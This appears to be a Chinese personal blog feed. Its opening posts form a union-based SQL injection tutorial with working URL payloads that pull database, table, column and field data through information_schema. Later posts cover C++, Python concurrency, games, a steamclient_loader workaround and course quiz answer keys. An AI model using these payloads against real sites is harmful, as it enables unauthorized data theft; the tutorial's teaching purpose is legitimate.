x</code></pre><p>当输入x报错时，真实的列数是「x-1」<br>(1)为什么用order by 可以证明前面语句查询了三列数据呢？<br>&emsp;&emsp;select * from order by (你要按照排序的对象)<br>&emsp;&emsp;order by可以按照指定的「字段名」排序<br>&emsp;&emsp;还可以按照「索引」进行排序，索引就是从左至右将列名按照123排序<br>&emsp;&emsp;对MySQL中查询结果按照指定字段名进行排序，左边第一个字段对应的索引是 1<br>&emsp;&emsp;当输入的索引溢出时它就会报错。<br>(2)我们为什么要知道前面查询了多少语句呢？<br>&emsp;&emsp;因为union前面查询语句查询的元素与后面查询语句查询的元素要在数量上一样<br>&emsp;&emsp;select 甲,乙,丙 union select 1,2,3<br>&emsp;&emsp;因为前面查询的语句有三个元素（甲，乙，丙）<br>&emsp;&emsp;所以后面查询的语句必须是三个元素（1，2，3）</p><p>4、找到显示位</p><pre><code>?id=-1 union select 1,2,3,4,5,6 --+</code></pre><p>如果在使用UNION SELECT 1,2,3…,11 from table时，网页中显示了信息8<br>那么说明网页只能够显示第8列中信息，不能显示其他列的信息。<br>也可以理解为网页只开放了8这个窗口，你想要查询数据库信息就必须要通过这个窗口。<br>所以如果我们想要知道某个属性的值，比如admin；<br>就要把admin属性放到8的位置上，这样就能通过第8列爆出admin的信息。<br>但是为了爆出第一位后面的显示位需要隐藏正常结果<br>比如将id=1改为id=-1，使union前面的语句报错，执行后面的，爆出显示位</p><p>5、利用显示位获取库名</p><pre><code>select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</code></pre><p>在高版本中查询该表就行，具体看上一篇文章。<br>group_concat()函数将所有查询的库名连在一起成为一条数据</p><pre><code>?id=-1&#39; union select 1,database(),3 --+</code></pre><p>假设判断出在2号位显示，那么在二号位换成想插入的SQL语句就行了。<br>相同的，这里也要让union前面的语句报错，执行后面的。</p><p>6、获取表名</p><pre><code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;库名&#39; --+</code></pre><p>相同的，这里也要让union前面的语句报错，执行后面的。<br>group_concat()函数将所有查询的表名连在一起成为一条数据</p><p>7、查询表中列名</p><pre><code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; --+</code></pre><p>数据库有个information_schema库，里面有个columns表，存有整个数据库的列名。<br>我们要去查找的列，就是在这个库中去找。</p><p>8、获取字段信息</p><pre><code>?id=-1’ union select 1,group_concat(列名),3 from 库名.表名 --+</code></pre><p>平平无奇，跟上面的没啥不同，等价于下面这条</p><pre><code>?id=-1’ union select 1,列名,3 from 库名.表名 limit 0,1 --+</code></pre><h4 id="联合查询注入是最简单的了，一定要完全看懂"><a href="#联合查询注入是最简单的了，一定要完全看懂" class="headerlink" title="联合查询注入是最简单的了，一定要完全看懂"></a>联合查询注入是最简单的了，一定要完全看懂</h4><h3 id="黑盒，白盒，灰盒测试"><a href="#黑盒，白盒，灰盒测试" class="headerlink" title="黑盒，白盒，灰盒测试"></a>黑盒，白盒，灰盒测试</h3><h4 id="黑盒测试（测试功能）"><a href="#黑盒测试（测试功能）" class="headerlink" title="黑盒测试（测试功能）"></a>黑盒测试（测试功能）</h4><p>黑盒测试是以用户的角度，从输入数据与输出数据的对应关系出发进行测试的。<br>目的是检测程序是否能适当地接收输入数据而产生正确的输出信息。<br>很明显，如果外部特性本身设计有问题或规格说明的规定有误，用黑盒测试方法是发现不了的。</p><h4 id="白盒测试（优化程序）"><a href="#白盒测试（优化程序）" class="headerlink" title="白盒测试（优化程序）"></a>白盒测试（优化程序）</h4><p>以开发者的角度，对程序内部细节的严密检验</p><h4 id="灰盒测试（修复bug）"><a href="#灰盒测试（修复bug）" class="headerlink" title="灰盒测试（修复bug）"></a>灰盒测试（修复bug）</h4><p>多用于集成测试阶段，不仅关注输出、输入的正确性，同时也关注程序内部的情况。<br>灰盒测试不像白盒那样详细、完整，但又比黑盒测试更关注程序的内部逻辑。<br>常常是通过一些表征性的现象、事件、标志来判断内部的运行状态。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入前置知识及注入原理</title>
      <link href="/2023/03/11/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/03/11/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>BurpSuite的及其拓展的安装及使用<br>SQLmap的下载及基本命令<br>了解少许PHP语言<br><strong>不断尝试的热情！</strong>                    </p><h4 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h4><h5 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h5><p>由于SQL语言是结构化查询语言(是操作数据库的语言,不懂的自己找我之前的文章)可以据库进行增、删、改、查等操作。<br>又因为程序员写的PHP代码不严谨，导致访问提交数据时，我们可以把代码提交到后台数据库，后台数据库处理这些数据时这些数据插入或拼接在一起形成了SQL语句命令，最后这个SQL语句可以被后台数据库作为恶意代码执行，从而达到你想达到的注入效果。</p><h5 id="SQL注入三要素"><a href="#SQL注入三要素" class="headerlink" title="SQL注入三要素"></a>SQL注入三要素</h5><p><em><strong>未严格过滤（没开waf等防护）<br>允许恶意修改（具有一定权限）<br>执行语句（能够闭合并执行的合法SQL语句）</strong></em></p><h5 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h5><p>按照注入时的表现来区分:<br>boolean-based blind – 布尔盲注<br>error-based – 报错注入<br>time-base blind – 延时注入<br>UNION query – 联合查询注入<br>堆叠查询注入</p><p>按照注入点区分:<br>字符型<br>数字型</p><p>按照提交数据方式来区分:<br>GET注入<br>POST注入<br>Cookie注入<br>HTTP头部注入</p><h5 id="注入测试一般流程"><a href="#注入测试一般流程" class="headerlink" title="注入测试一般流程"></a>注入测试一般流程</h5><pre><code>(1)寻找注入点:可通过web扫描工具实现；        是否存在注入并且判断注入类型(2)利用注入点:尝试通过注入获得各种信息，越多越好；(3)数据处理:猜解关键数据库表及其重要字段与内容；        猜解SQL查询语句的字段数        确定回显点        查询数据库信息        查询用户名，数据库名(4)后续攻击:通过获取的用户信息，寻找后台登录并利用后台或了解的进一步信息。        文件读取        写入shell</code></pre><h4 id="一些杂七杂八的拓展知识"><a href="#一些杂七杂八的拓展知识" class="headerlink" title="一些杂七杂八的拓展知识"></a>一些杂七杂八的拓展知识</h4><pre><code>在MySQL5.0版本以后MySQL数据库中会默认存放一个information_schema的数据库，在该数据库中，我们需要记住三个表名，分别是schemata，tables，columns。schemata表字段schema_name记录着数据库的库名；tables表字段table_schema和table_nmae分别记录着数据库中的库名和表名；columns表字段table_schema和table_name以及columns_name分别记录着数据库的库名、表名、字段名；select 原始查询内容 union select 构造的内容两者下一级的个数必须保持一致select * from order by 你要按照排序的对象对MySQL中查询结果按照指定字段名进行排序，左边第一个字段对应的索引是 1limit 一个一个打印出来group_concat 一次性全部打印group_concat()函数将同一组的列显示出来，相当于爆出该数据库的全部表concat_ws(分隔符，str1，str2，……)函数同时显示多个字段，并以分隔符分开concat(str1，str2，str3，…)函数同时显示多个字段，其中有一个字段为null，则返回nullSQL语句结尾加上limit 0,1表示一个一个输出前面的语句的结果0x20是空格常用函数:length()                # 返回字符串的长度substring()                        substr()                # 截取字符串mid()left()                    # 从左侧开始取指定字符个数的字符串concat()                    # 没有分隔符的连接字符串concat_ws()              # 含有分割符的连接字符串group_conat()           # 连接一个组的字符串ord()                    # 返回ASCII 码ascii()    hex()                    # 将字符串转换为十六进制unhex()                    # hex 的反向操作md5()                    # 返回MD5 值floor(x)                # 返回不大于x 的最大整数round()                    # 返回参数x 接近的整数rand()                    # 返回0-1 之间的随机浮点数load_file()                # 读取文件，并返回文件内容作为一个字符串sleep()                    # 睡眠时间为指定的秒数if(true,t,f)            # if 判断find_in_set()            # 返回字符串在字符串列表中的位置benchmark()                # 指定语句执行的次数</code></pre><h4 id="较难理解的注释语句"><a href="#较难理解的注释语句" class="headerlink" title="较难理解的注释语句"></a>较难理解的注释语句</h4><pre><code>#和-- 表示注释，可以使它们后面的语句不被执行(--后有个空格)get请求解释执行的时候，url中#号是锚点，所以HTTP请求中使用#闭合无法注释。而-- 在传输过程中--与后面的单引号连接在一起，也无法形成有效的mysql语句。那么要启动空格的作用就需要在--后面加上一点字符，比如+或&#39;(因为+会被解释成空格)当然，也可以使用--%20，把空格转换为urlencode编码格式，也不会报错。同理把#变成%23,也不报错。如果是post请求，则可以直接使用#来进行闭合。常见的就是表单注入，如在后台登录框中进行注入。另外#后面可以有空格，也可以没有(sql就是这么规定的，记住就行了)</code></pre><h5 id="最后哔哔一句，如果你丫这都看不懂，那你别学了。"><a href="#最后哔哔一句，如果你丫这都看不懂，那你别学了。" class="headerlink" title="最后哔哔一句，如果你丫这都看不懂，那你别学了。"></a>最后哔哔一句，如果你丫这都看不懂，那你别学了。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拷贝相关</title>
      <link href="/2023/03/09/%E6%8B%B7%E8%B4%9D%E7%9B%B8%E5%85%B3/"/>
      <url>/2023/03/09/%E6%8B%B7%E8%B4%9D%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h5 id="本篇文章简要记录一下C-拷贝相关的知识以及误区。"><a href="#本篇文章简要记录一下C-拷贝相关的知识以及误区。" class="headerlink" title="本篇文章简要记录一下C++拷贝相关的知识以及误区。"></a>本篇文章简要记录一下C++拷贝相关的知识以及误区。</h5><p>   <strong>首先上定义:</strong><br>   拷贝和浅拷贝是指在对对象一份复制或者复制某些部分时所表现出来的差异。</p><p>   浅拷贝只复制对象的引用，由于是引用，所以当拷贝对象中的属性变化时，原始对象和拷贝对象共享这些属性的变化，也就是说，拷贝对象的属性变化会影响到原始对象的属性。因为是浅拷贝，所以拷贝的对象和原来的对象不是两个的独立存在，而是共享数据存储空间。</p><p>   深拷贝则是在复制对象的指针引用的同时，完全复制一份内容相同的对象。也就是说，深度拷贝会创建一个新的对象，而不仅仅是拷贝其指针引用，因此，它们的变化互不影响。人们可以自由操作两个对象，而不会对另一个产生影响。因此，深拷贝能够完整地承载原对象所有信息。这个复制后的对象与原对象彻底分离，内存空间也不同了。</p><p>   简单地说:浅拷贝会影响原有的数据，相当于做了路径引用；深拷贝是另外开辟了内存空间，相当于复制了一个。</p><p>   <strong>然后是一个比较大的误区(可能是我比较菜所以搞不懂):</strong><br>   使用指针传递值是浅拷贝。</p><p>   当使用指针传递值时，函数参数传递的是指针所指向的内存地址，而不是实际的变量本身。因此，函数内部对于指针所指向的数据进行的操作，会直接影响到原始数据，属于浅拷贝。</p><p>   如果需要进行深拷贝，可以使用其他方式，比如使用引用传递或者复制构造函数等。</p><p><strong>上代码才看得懂！</strong></p><pre class="line-numbers language-c++"><code class="language-c++">指针可以直接访问和修改原数据的地址，从而实现更改原数据。具体操作步骤如下：1. 定义指针变量并初始化为原数据的地址：int data = 10;int* pData = &data;2. 通过指针访问和修改原数据：*pData = 20;  // 将原数据修改为20完整示例代码如下：#include <iostream>using namespace std;int main() &#123;    int data = 10;    int* pData = &data;    cout << "原数据：" << data << endl;    *pData = 20;    cout << "更改后的数据：" << data << endl;    return 0;&#125;输出结果为：原数据：10更改后的数据：20<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="今天就这么多，写作业去了。"><a href="#今天就这么多，写作业去了。" class="headerlink" title="今天就这么多，写作业去了。"></a>今天就这么多，写作业去了。</h4>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arcaea</title>
      <link href="/2023/03/08/Arcaea/"/>
      <url>/2023/03/08/Arcaea/</url>
      
        <content type="html"><![CDATA[<h3 id="Final-Verdict"><a href="#Final-Verdict" class="headerlink" title="Final Verdict"></a>Final Verdict</h3><p><img src="https://s2.loli.net/2023/03/09/hOT6eWV85gIwX1j.jpg" alt="第一个必须得是咲弥！"><br><img src="https://s2.loli.net/2023/03/09/NKS61Q3PV8spoIL.jpg" alt="光光怎么哭了呜呜呜"><br><img src="https://s2.loli.net/2023/03/09/zNcPyYS5qmhxXnR.jpg" alt="我可怜的光光"><br><img src="https://s2.loli.net/2023/03/09/gHa1KlTMLGfrCsx.jpg" alt="牵着我的手"><br><img src="https://s2.loli.net/2023/03/09/g6T9YwRuFqBNoHL.jpg" alt="目视崩溃的未来"><br><img src="https://s2.loli.net/2023/03/08/1SqIAni59T7bZ8y.png" alt="贴贴"><br><img src="https://s2.loli.net/2023/03/08/dU8i4P1BxQuTSCt.png" alt="Arcaea的残骸"><br><img src="https://s2.loli.net/2023/03/08/QGgLYvEh7TeakJI.png"><br><img src="https://s2.loli.net/2023/03/08/4ki3oUOtQI2FyRn.png"><br><img src="https://s2.loli.net/2023/03/08/cCpUPTDjX4KLrHi.png" alt="尾声"></p>]]></content>
      
      
      <categories>
          
          <category> 图片 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>喵斯？快跑！</title>
      <link href="/2023/03/05/%E5%96%B5%E6%96%AF%E5%BF%AB%E8%B7%91%EF%BC%81/"/>
      <url>/2023/03/05/%E5%96%B5%E6%96%AF%E5%BF%AB%E8%B7%91%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<h5 id="这篇文章就是来吐槽musedash的！"><a href="#这篇文章就是来吐槽musedash的！" class="headerlink" title="这篇文章就是来吐槽musedash的！"></a>这篇文章就是来吐槽musedash的！</h5><p>该死的喵斯，你单单靠自己频繁的联动是注定无法长久地保存音游圈的流量的！<br>首先，那个该死的只能228软妹币一次性买断的曲包机制，<br>以及在各个平台的同一账号购买记录不互通就足够烦恼了。<br>然后，更难受的还得是资源封锁。<br>人家Phigros和Arcaea都有各自在民间广泛流传的自制谱渠道。<br>燃鹅你游官方不给就算了，还任由某个小团体封锁自制的资源。<br>甚至有考核乐理和游戏排行来决定玩家是否能够拥有写谱的资格。<br><strong>对此我只能说是离谱至极！</strong><br>自制铺面本应是趁兴而为。<br>但是，我为了导入一首I Got Smoke不得不加了三个喵斯群，一个考核群。<br>最后还是自己花了6个小时在互联网上找到各方零散资源，<br>再自行尝试修改才成功的。<br>如此可见，如果一个热爱喵斯而实力不强的玩家遇到这种情况，<br>那么将会是一盆冷水浇个透心凉！</p><p>下面的图你们自己看看吧。<br><img src="https://s2.loli.net/2023/03/05/fhio3NYLdr8bFHt.png" alt="载入mdmc"><br><img src="https://s2.loli.net/2023/03/05/Esnuw7XrcQkVjAq.png" alt="最后有折磨多"><br><img src="https://s2.loli.net/2023/03/05/f1KrcBpDX65T7Ow.png" alt="终于搞定了"></p><p>这里是阿里云盘的<a href="https://www.aliyundrive.com/s/UqrJ8R732JC">分享链接</a>，提取码是4qt8</p><p>下面是使用教程:<br>1.“下崽”并解压至没有中文的路径比如桌面(问为什么的找GPT去)<br>2.双击MuseDash文件夹里的那个steamclient_loader文件<br>3.千万不要点MuseDash这个应用程序(你爱试就逝咯)<br>4.如果成功运行，按Q找西瓜图标的自定义包就行了<br>5.如果卡了或命令行卡在下载某个zip文件那就Ctrl+C一下<br>6.实在不行就双击解压出来的另一个文件，选择MuseDash这个应用程序然后漫长等待。<br>7.上一步需要科学上网<br>8.如果按上面做都不行就去该博客GitHub仓库找我。</p><h5 id="不写每日一句了，下午还有个会议，晚上有晚自习。早点睡了。"><a href="#不写每日一句了，下午还有个会议，晚上有晚自习。早点睡了。" class="headerlink" title="不写每日一句了，下午还有个会议，晚上有晚自习。早点睡了。"></a>不写每日一句了，下午还有个会议，晚上有晚自习。早点睡了。</h5>]]></content>
      
      
      <categories>
          
          <category> 资源 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 资源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于Python的四程理解</title>
      <link href="/2023/03/04/%E5%9F%BA%E4%BA%8EPython%E7%9A%84%E5%9B%9B%E7%A8%8B%E7%90%86%E8%A7%A3/"/>
      <url>/2023/03/04/%E5%9F%BA%E4%BA%8EPython%E7%9A%84%E5%9B%9B%E7%A8%8B%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h4 id="总述"><a href="#总述" class="headerlink" title="总述"></a>总述</h4><p>网络编程，几乎所有网络的通信本质上都是通过socket模块实现。<br>并发编程，将串行的程序变为并发,提升代码执行的效率。<br>线程是计算机中可以被cpu调度的最小单元(真正在工作）。<br>进程是计算机资源分配的最小单元（进程为线程提供资源）。<br>一个进程中可以有多个线程,同一个进程中的线程可以共享此进程中的资源。</p><h4 id="GIL"><a href="#GIL" class="headerlink" title="GIL"></a>GIL</h4><p>CPython解释器特有的全局解释器锁，让一个进程中同一个时刻只能有一个线程可以被CPU调用。<br>因为多进程的成本比多线程的成本高，所以建议计算密集型用多进程；IO密集型用多线程。<br>同时创建进程数建议与CPU个数相同，合理创建线程数</p><h4 id="多线程开发"><a href="#多线程开发" class="headerlink" title="多线程开发"></a>多线程开发</h4><pre><code>import threadinglock_object = threading.RLock()def task(arg):    lock_object.acquire() # 加锁    pass    lock_object.release() # 释放锁        # 创建一个Thread对象（线程），并封装线程被CPU调度时应该执行的任务和相关参数。    t = threading.Thread(target=task,args=(&#39;xxx&#39;,))        #设置为守护线程，主线程执行完毕后，子线程也自动关闭。    #默认设置为非守护线程，主线程等待子线程，子线程执行完毕后，主线程才结束。    #守护线程必须在start之前    t.setDaemon(True/False)        # 线程准备就绪（等待CPU调度），代码继续向下执行。    t.start()    # 等待当前线程的任务执行完毕后再向下继续执行。    t.join()print(&quot;继续执行...&quot;) # 主线程执行完所有代码，不结束（等待子线程）</code></pre><h4 id="线程锁"><a href="#线程锁" class="headerlink" title="线程锁"></a>线程锁</h4><p>在程序中手动加锁方法：同步锁Lock和递归锁RLock。<br>RLock支持多次申请锁和多次释放；Lock不支持。<br>死锁————由于竞争资源或者由于彼此通信而造成的一种阻塞的现象。<br>有些操作默认都是线程安全的，使用的时无需再通过锁再处理</p><pre><code>import threadinglock_object = threading.RLock()def task(arg):    lock_object.acquire() # 加锁（令其它的等待）    pass    lock_object.release() # 释放锁（继续其它的任务）//或者使用with lock_object自动执行 acquire 和 release</code></pre><h4 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h4><pre><code>import timefrom concurrent.futures import ThreadPoolExecutor# pool = ThreadPoolExecutor(100)# pool.submit(函数名,参数1，参数2，参数...)def task(video_url,num):    print(&quot;开始执行任务&quot;, video_url)    time.sleep(5)# 创建线程池，最多维护10个线程。pool = ThreadPoolExecutor(10)url_list = []for url in url_list:    # 在线程池中提交一个任务，线程池中如果有空闲线程，则分配一个线程去执行，执行完毕后再将线程交还给线程池；如果没有空闲线程，则等待。    pool.submit(task, url,2)    print(&quot;END&quot;)</code></pre><h4 id="多进程开发"><a href="#多进程开发" class="headerlink" title="多进程开发"></a>多进程开发</h4><p>关于在Python中基于multiprocessiong模块操作的进程：<br><em>fork</em>，【unix】【任意位置开始】【快】<br><em>spawn</em>，【unix、win】【main代码块开始】【慢】<br><em>forkserver</em>，【部分unix】【main代码块开始】</p><pre><code>import multiprocessingfrom multiprocessing import Processmultiprocessing.set_start_method(&quot;spawn&quot;)   #选择操作进程def task():    passif __name__ == &#39;__main__&#39;:    #当前进程准备就绪，等待被CPU调度（工作单元其实是进程中的线程）    p1 = multiprocessing.Process(target=task)        #设置为守护线程，主线程执行完毕后，子线程也自动关闭。    #默认设置为非守护线程，主线程等待子线程，子线程执行完毕后，主线程才结束。    #守护线程必须在start之前    p.daemon(True/False)        p1.start()    #等待当前进程的任务执行完毕后再向下继续执行    p.join()    #这两行一定要放在初始化之后</code></pre><h4 id="进程锁-amp-进程池"><a href="#进程锁-amp-进程池" class="headerlink" title="进程锁&amp;进程池"></a>进程锁&amp;进程池</h4><p><em><strong>概念与用法与线程相似</strong></em><br>如果在进程池中要使用进程锁，则需要基于Manager中的Lock和RLock来实现。</p><h4 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h4><p>协程（Coroutine），是程序员通过代码搞出来的一个东西（非真实存在）。<br>协程也可以被称为微线程，是一种用户态内的上下文切换技术。<br>简而言之，其实就是通过一个线程实现代码块相互切换执行（来回跳着执行）。<br>协程比线程更加节省开销，但协程的开发难度大一些。</p><pre><code>&lt;案例&gt;【greenlet】from greenlet import greenletdef func1():    print(1)        # 第1步：输出 1    gr2.switch()    # 第3步：切换到 func2 函数    print(2)        # 第6步：输出 2    gr2.switch()    # 第7步：切换到 func2 函数，从上一次执行的位置继续向后执行def func2():    print(3)        # 第4步：输出 3    gr1.switch()    # 第5步：切换到 func1 函数，从上一次执行的位置继续向后执行    print(4)        # 第8步：输出 4gr1 = greenlet(func1)gr2 = greenlet(func2)gr1.switch() # 第1步：去执行 func1 函数【yield】from yield import yielddef func1():    yield 1    yield from func2()    yield 2def func2():    yield 3    yield 4f1 = func1()for item in f1:    print(item)</code></pre><p>让线程更加有意义:遇到IO请求时自动化切换（异步代码）</p><pre><code>&lt;案例&gt;import asyncioasync def func1():    print(1)    await asyncio.sleep(2)    print(2)    async def func2():    print(3)    await asyncio.sleep(2)    print(4)    tasks = [    asyncio.ensure_future(func1()),    asyncio.ensure_future(func2())]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks))</code></pre><p>写完这些已经很晚了，早上有时间再搞个异步代码和装饰器的文章吧。</p><h3 id="每日一句（多久没写了？）"><a href="#每日一句（多久没写了？）" class="headerlink" title="每日一句（多久没写了？）"></a>每日一句（多久没写了？）</h3><h5 id="其实“正常”才是无数误差交织中的碰巧完美。"><a href="#其实“正常”才是无数误差交织中的碰巧完美。" class="headerlink" title="其实“正常”才是无数误差交织中的碰巧完美。"></a>其实“正常”才是无数误差交织中的碰巧完美。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C&amp;C++</title>
      <link href="/2023/03/03/C-C/"/>
      <url>/2023/03/03/C-C/</url>
      
        <content type="html"><![CDATA[<h4 id="C和C-的部分差别"><a href="#C和C-的部分差别" class="headerlink" title="C和C++的部分差别"></a>C和C++的部分差别</h4><h5 id="1-存储类"><a href="#1-存储类" class="headerlink" title="1.存储类"></a>1.存储类</h5><p><em>存储类定义程序</em>中变量/函数的范围（可见性）和生命周期。<br>C++比较C多了mutable和thread_local类型</p><pre><code>mutable 说明符仅适用于类的对象，使用 thread_local 说明符声明的变量仅可在它在其上创建的线程上访问。 </code></pre><p>注意:<br>从 C++ 17 开始，auto 关键字不再是 C++ 存储类说明符，且 register 关键字被弃用。<br>thread_local用于C++11</p><h5 id="2-函数参数的调用"><a href="#2-函数参数的调用" class="headerlink" title="2.函数参数的调用"></a>2.函数参数的调用</h5><p>C++可以指针调用。<br>该方法把参数的地址赋值给形式参数。在函数内，该地址用于访问调用中要用到的实际参数。这意味着，修改形式参数会影响实际参数。<br>C不可以使用指针调用。</p><h5 id="3-指针"><a href="#3-指针" class="headerlink" title="3.指针"></a>3.指针</h5><p>C++比较C能够支持空指针。NULL 指针是一个定义在标准库中的值为零的常量。</p><h5 id="4-头文件"><a href="#4-头文件" class="headerlink" title="4.头文件"></a>4.头文件</h5><pre><code>【C】#include &lt;stdio.h&gt;      引用系统头文件。它在系统目录的标准列表中搜索名为 file 的文件。#include &quot;xxxxx&quot;        引用用户头文件。它在包含当前文件的目录中搜索名为 file 的文件。【C++】 头文件      函数和描述iostream    该文件定义了 cin、cout、cerr 和 clog 对象，分别对应于标准输入流、标准输出流、非缓冲标准错误流和缓冲标准错误流。iomanip     该文件通过所谓的参数化的流操纵器（比如 setw 和 setprecision），来声明对执行标准化 I/O 有用的服务。fstream     该文件为用户控制的文件处理声明服务。我们将在文件和流的相关章节讨论它的细节。</code></pre><h5 id="5-输入输出"><a href="#5-输入输出" class="headerlink" title="5.输入输出"></a>5.输入输出</h5><pre><code>            【C】        【C++】标准输入    stdin          cin           键盘标准输出    stdout         cout          屏幕标准错误    stderr         cerr          您的屏幕</code></pre><h6 id="6-文件读写"><a href="#6-文件读写" class="headerlink" title="6.文件读写"></a>6.文件读写</h6><p>C与C++的文件操作都属于面向对象，使用起来较为繁琐，需要记住很多函数。<br>对文件的操作都分为三个步骤:打开文件&gt;操作文件&gt;关闭文件</p><pre><code>【C】FILE *fopen( const char *filename, const char *mode );//要打开的文件名,不指定路径,则在当前文件夹找//打开的模式 读r 写w 或追加a//返回值:打开失败返回NULL,打开成功则返回指向文件的标识符int fputc( int c, FILE *fp );//写入文件int fclose( FILE *fp );//关闭文件【C++】int main() &#123;    fstream file;    file.open(&quot;filename&quot;,ios::mode); //以只写模式打开文件    char buf[] = &quot;内容&quot;;    file.write(buf,sizeof(buf));       //写入文件末尾    file.read(buf,mode);              //读文件    file.close();                      //关闭文件&#125;//modeapp      每次写入前寻位到流结尾binary   以二进制模式打开in       以读打开out      以写打开trunc    在打开时舍弃流的内容ate      打开后立即寻位到流结尾</code></pre><h6 id="7-异常处理"><a href="#7-异常处理" class="headerlink" title="7.异常处理"></a>7.异常处理</h6><p>C++有一个应对出现错误的机制，叫做异常处理。当程序运行发生错误时，可以抛出一个异常，异常处理程序会捕捉它并采取相应的措施。C语言并没有内置的异常机制。</p><h5 id="8-编译器"><a href="#8-编译器" class="headerlink" title="8.编译器"></a>8.编译器</h5><p>C语言和C++语言的编译器可不同。尽管有些编译器支持两种语言，但某些特征可能仅仅由一个语言所支持。</p><h5 id="9-名称空间"><a href="#9-名称空间" class="headerlink" title="9.名称空间"></a>9.名称空间</h5><p>C++有一个关键字叫做namespace，用于区分相同名称的函数和变量。C语言中没有这个特性。</p><h5 id="10-头文件"><a href="#10-头文件" class="headerlink" title="10.头文件"></a>10.头文件</h5><p>在C++中，头文件可以有任何扩展名，而在C语言中，它们必须是.h扩展名。</p><h5 id="11-默认变量初始化"><a href="#11-默认变量初始化" class="headerlink" title="11.默认变量初始化"></a>11.默认变量初始化</h5><p>在C++中，类的成员变量默认情况下会被初始化。而在C语言中，变量的内容是未定义的，程序可能会因此出现意外错误。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>C++语言是C语言的扩展，它包含了所有C语言的特性，并增加了一些特有的特性。C++是一个更为现代化的语言，用于更复杂的编程环境，特别是当需要面向对象编程时，C++是首选语言。而C语言则侧重于系统编程，嵌入式编程等。</p><h5 id="我只是刚开始学习C与C-，如果发现错误请在Github仓库中找到我。"><a href="#我只是刚开始学习C与C-，如果发现错误请在Github仓库中找到我。" class="headerlink" title="我只是刚开始学习C与C++，如果发现错误请在Github仓库中找到我。"></a>我只是刚开始学习C与C++，如果发现错误请在Github仓库中找到我。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UOOC中国近现代史纲要答案</title>
      <link href="/2023/02/20/UOOC%E4%B8%AD%E5%9B%BD%E8%BF%91%E4%BB%A3%E5%8F%B2%E7%BA%B2%E8%A6%81%E7%AD%94%E6%A1%88/"/>
      <url>/2023/02/20/UOOC%E4%B8%AD%E5%9B%BD%E8%BF%91%E4%BB%A3%E5%8F%B2%E7%BA%B2%E8%A6%81%E7%AD%94%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<h5 id="此文章答案仅为个人记录所用，请勿用于其他用途"><a href="#此文章答案仅为个人记录所用，请勿用于其他用途" class="headerlink" title="此文章答案仅为个人记录所用，请勿用于其他用途"></a><em>此文章答案仅为个人记录所用，请勿用于其他用途</em></h5><h5 id="不保证完全一致，极可能存在多套题组，请核对后再查看"><a href="#不保证完全一致，极可能存在多套题组，请核对后再查看" class="headerlink" title="不保证完全一致，极可能存在多套题组，请核对后再查看"></a>不保证完全一致，极可能存在多套题组，请核对后再查看</h5><h5 id="tip：PC网页版刷新后是另一套题组"><a href="#tip：PC网页版刷新后是另一套题组" class="headerlink" title="tip：PC网页版刷新后是另一套题组"></a>tip：PC网页版刷新后是另一套题组</h5><h4 id="第1章"><a href="#第1章" class="headerlink" title="第1章"></a>第1章</h4><p>单选<br>1-5:CCABB<br>6-10:DCBDD<br>多选<br>11.AB<br>12-16:ABCD<br>17:BCD<br>18:ACD<br>19:AB<br>20.AB<br>判断<br>21-25:BABBB<br>26-30:BBBBB</p><h4 id="第2章"><a href="#第2章" class="headerlink" title="第2章"></a>第2章</h4><p>1-5:ACCDD<br>6-10:CCCBC<br>11:AB<br>12:ABCD<br>13:CD<br>14:BCD<br>15:ACD<br>16-17:ABCD<br>18:BC<br>19:ABCD<br>20:BCD<br>21-25:BBAAB<br>16-20:BAABB</p><h4 id="第3章"><a href="#第3章" class="headerlink" 